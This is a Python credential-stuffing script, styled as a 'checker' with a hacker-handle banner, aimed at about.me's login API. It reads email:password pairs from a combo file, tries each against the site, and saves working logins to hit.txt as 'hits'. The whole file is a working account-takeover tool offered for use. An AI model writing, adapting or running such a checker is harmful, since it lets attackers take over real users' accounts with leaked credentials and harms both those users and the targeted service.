import requests
from colorama import Fore
print(Fore.RED+f'''
 ██ ▄█▀    █    ██     ██▀███     ▓█████▄ 
 ██▄█▒     ██  ▓██▒   ▓██ ▒ ██▒   ▒██▀ ██▌
▓███▄░    ▓██  ▒██░   ▓██ ░▄█ ▒   ░██   █▌
▓██ █▄    ▓▓█  ░██░   ▒██▀▀█▄     ░▓█▄   ▌
▒██▒ █▄   ▒▒█████▓    ░██▓ ▒██▒   ░▒████▓ 
▒ ▒▒ ▓▒   ░▒▓▒ ▒ ▒    ░ ▒▓ ░▒▓░    ▒▒▓  ▒ 
░ ░▒ ▒░   ░░▒░ ░ ░      ░▒ ░ ▒░    ░ ▒  ▒ 
░ ░░ ░     ░░░ ░ ░      ░░   ░     ░ ░  ░ 
░  ░         ░           ░           ░    
                                   ░      
''')
print(Fore.RESET+f'''===========================================''')
print('this checker cread !!')
print('By '+Fore.RED + f"Ta3uN , HK1")
print(Fore.RESET+f'''===========================================''')

# Open the file using 'with' to ensure it is properly closed afterwards
file_location=input('input file location: ')
with open(file_location, "r") as a:
    file = [s.rstrip() for s in a.readlines()]

req = requests.session()
stop = "default"

for lines in file:
    combo = lines.split(":")
    param = {
        "email_address": combo[0],
        "password": combo[1],
        "rememberme": "true"
    }

    try:
        # Send the post request with the parameters
        sourc = req.post("https://api.about.me/login", data=param)

        # Check if the response contains 'UNAUTHORIZED'
        if "UNAUTHORIZED" in sourc.text:
            print(Fore.RED+f"Fail: {combo[0]}, {combo[1]}")
        else:
            print(Fore.GREEN+f"Success: {combo[0]}, {combo[1]}")
            filee=open('hit.txt','a')
            filee.write('\nwebsite Name: about.me : Hit: '+combo[0]+':'+combo[1])

    except requests.exceptions.RequestException as e:
        # Catch and print request exceptions
        print(f"An error occurred: {e}")

    # Check if stop keyword is in the email
    if stop in combo[0]:
        break